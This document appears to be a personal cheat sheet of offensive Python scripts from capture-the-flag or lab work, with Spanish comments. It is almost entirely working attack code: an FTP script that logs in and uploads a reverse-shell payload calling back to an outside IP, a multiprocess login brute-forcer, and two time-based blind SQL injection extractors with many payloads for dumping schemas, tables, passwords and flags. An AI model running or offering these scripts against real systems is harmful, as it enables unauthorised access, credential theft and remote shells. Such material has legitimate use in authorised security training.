# Scripts for services

## FTP

```python
#!/usr/bin/python3

from ftplib import FTP
import io

# Connecting:
ftp = FTP(host = '127.0.0.1')
# Authentication:
ftp.login(user= "backupmgr", passwd= "p4ssw0rd")
ftp.getwelcome() # A Python string containing the welcome message (optional).

ftp.set_pasv(False) # Active/Passive?
ftp.dir() # Print current directory
ftp.cwd('/files') # Change working directory

payload = io.BytesIO(b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.0.140",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
empty = io.BytesIO(b'')

ftp.storlines('STOR exploit.sh', payload) # Upload file with content (payload).
ftp.storlines('STOR test.txt', empty) # Upload file (empty).

ftp.quit() # Quit.
```

## HTTP

```python
#!/usr/bin/python3

import os
import re
import requests
import signal
import sys
from multiprocessing import Pool
from pwn import log

# Ctrl+C
def def_handler(sig, frame):
	print("\n[!] Saliendo...\n")
	os.system("tput cnorm")
	os._exit(0)

signal.signal(signal.SIGINT, def_handler)

MAX_PROC = 100
url = "<URL>"
param1 = "<USERNAME>"
burp = {'http': 'http://127.0.0.1:8080'}
#csrf_pattern = re.compile('name="csrf" value="(\w+)" /')

def usage():
	print("{} [wordlist]".format(sys.argv[0]))
	print("[wordlist should be one word per line]")
	os.system("tput cnorm")
	os._exit(1)

def check_param2(param2):
	#r = requests.get(url)
	#csrf = re.search(csrf_pattern, r.text).group(1)
	#PHPSESSID = [x.split('=')[1] for x in r.headers['Set-Cookie'].split(';') if x.split('=')[0] == 'PHPSESSID'][0]

	data = {
		"username": param1,
		"password": param2
	}
	#time_start = time.time() # For time based.
	r = requests.post(url, data=data) # For json: json=data
	#time_end = time.time() # For time based.
	if '<ERROR MESSAGE>' in r.text: # For time based: time_end - time_start > <TIME>
		return param2, False
	else:
		return param2, True

def main(wordlist, nprocs=MAX_PROC):
	with open(wordlist, 'r', encoding='latin-1') as f:
		words = f.read().rstrip().replace('\r','').split('\n')
		# Mutations:
		#words = [x.lower() for x in words] + [x.capitalize() for x in words] + words + [x.upper() for x in words]
	pool = Pool(processes=nprocs)
	i = 0
	p1 = log.progress("Brute force")
	p1.status(f"Status -> {i}/{len(words)}")
	try:
		for param2, status in pool.imap_unordered(check_param2, [param for param in words]):
			if status:
				p1.success("Found -> {}".format(param2))
				pool.terminate()
				os.system("tput cnorm")
				os._exit(0)
			else:
				i += 1
				p1.status(f"Status -> {i}/{len(words)}")
	except Exception as e:
		log.error(str(e))
		p1.failure("Status -> Password not found")

if __name__ == '__main__':
	if len(sys.argv) != 2:
		usage()
	main(sys.argv[1])
```

### JSON data

If we need to use JSON format, we can do it in 2 ways:

```bash
# Way 1:
import json
r = requests.post(url, json=data)
# Way 2:
import json
data = {}
data['username'] = 'admin'
data['password'] = 'password123'
json_data = json.dumps(data)
r = requests.post(url, data=json_data)
```

## SQLI Blind

```python
#!/usr/bin/python3

import os
import sys
import signal
import requests
import string
import time
import urllib3
from pwn import log

url = "http://10.10.45.15/"

def def_handler(sig,frame):
    print("Saliendo")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
all_letters = "_0123456789.:{}" + string.ascii_letters

def check(payload):
    urllib3.disable_warnings()
    s = requests.Session()
    #s.headers.update({
    #    'Cookie' : f"""TrackingId=oXzIpOMlsPJqquRB{payload}; session=KOs6XrgzU90euH5rwRVVXZx0NiFGM0W6"""
    #})
    headers = {
        'X-Forwarded-For': f'{payload}'
    }
    s.verify = False
    s.keep_alive = False
    time_start = time.time()
    r = s.get(url, headers=headers)
    time_end = time.time()
    if time_end - time_start > 10:
    #if 'false' in r.text:
        return 1

def query():
    p2 = log.progress("Payload")
    for j in range(0,5): # Modificar el valor para obtener mas dbs,tables,columns,etc.
        name_database = ""
        finish = True
        p1 = log.progress(f"Database {j}")
        #for i in range(0,30): # Postgres SQL
        for i in range(10,50): # MySQL
            found_letter = 0
            for character in all_letters:
                #sqli = f"""' AND (SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 offset {j}),{i},1))='{character}"""
                #sqli = f"""' AND (SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 offset {j}),{i},1))='{character}"""
                #sqli = f"""' AND (SELECT SUBSTRING((SELECT password FROM users LIMIT 1 offset {j}),{i},1))='{character}"""
                #sqli = f"""'%3bSELECT CASE WHEN (SELECT SUBSTRING((SELECT datname from pg_database LIMIT 1 offset {j}),{i},1)='{character}') THEN pg_sleep(10) ELSE pg_sleep(0) END-- -"""
                #sqli = f"""admin' AND (SUBSTR((SELECT schema_name FROM information_schema.schemata LIMIT {j},1),{i},1))='{character}'-- -""" # SELECT SUBSTRING
                #sqli = f"""admin' AND (SELECT SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT {j},1),{i},1))='{character}'-- -"""
                #sqli = f"""admin' AND (SELECT SUBSTRING((SELECT flag FROM sqhell_3.flag LIMIT {j},1),{i},1))='{character}'-- -"""
                sqli = f"""' AND (SELECT sleep(10) FROM flag where (SUBSTR(flag,{i},1)) = '{character}')-- -"""
                p2.status(sqli)
                if check(sqli):
                    name_database += character
                    found_letter = 1
                    p1.status(f"{name_database}")
                    finish = False
                    break
            if found_letter == 0 or finish == True:
                break
        if finish == True:
            p1.failure()
        else:
            p1.success(name_database)

if __name__ == "__main__":
    query()

```

```python
#!/usr/bin/python3

import os
import sys
import time
import signal
import requests
import string
import urllib3
from pwn import log

url = "http://10.10.2.223/login/index.php"

def def_handler(sig,frame):
    print("Saliendo")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
all_letters = "_0123456789.:{}" + string.ascii_letters
all_ascii = []
burp = {'http': 'http://127.0.0.1:8080'}

def check(payload):
    urllib3.disable_warnings()
    s = requests.Session()
    #s.headers.update({
    #    'Cookie' : f"""TrackingId=oXzIpOMlsPJqquRB{payload}; session=KOs6XrgzU90euH5rwRVVXZx0NiFGM0W6"""
    #})
    #headers = {
        #'X-Forwarded-For': f'{payload}'
        #'Content-Type' : 'application/x-www-form-urlencoded'
    #}
    # username=admin&password=asd&submit=submit
    data = {
        'username' : f"{payload}",
        'password' : "a",
        "submit" : "submit"
    }
    s.verify = False
    s.keep_alive = False
    time_start = time.time()
    r = s.post(url, data=data)
    time_end = time.time()
    if time_end - time_start > 10:
    #if 'false' in r.text:
        return 1

def query():
    p2 = log.progress("Payload")
    for j in range(0,5): # Modificar el valor para obtener mas dbs,tables,columns,etc.
        name_database = ""
        finish = True
        p1 = log.progress(f"Database {j}")
        #for i in range(0,30): # Postgres SQL
        for i in range(1,60): # MySQL
            found_letter = 0
            for character in all_ascii:
                #sqli = f"""' AND (SUBSTR((SELECT schema_name FROM information_schema.schemata LIMIT {j},1),{i},1))='{character}'-- -""" # SELECT SUBSTRING
                #sqli = f"""admin' AND (SELECT SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT {j},1),{i},1))='{character}'-- -"""
                #sqli = f"""' AND (SELECT SUBSTRING((SELECT flag FROM sqhell_3.flag LIMIT {j},1),{i},1))='{character}'-- -"""
                sqli = f"""' AND (select sleep(10) from dual where ascii(substr(database(),{i},1))={character})-- -"""
                p2.status(sqli)
                if check(sqli):
                    name_database += chr(character)
                    found_letter = 1
                    p1.status(f"{name_database}")
                    finish = False
                    break
            if found_letter == 0 or finish == True:
                break
        if finish == True:
            p1.failure()
        else:
            p1.success(name_database)

if __name__ == "__main__":
    for i in range(32,127):
        all_ascii.append(i)
    query()

```
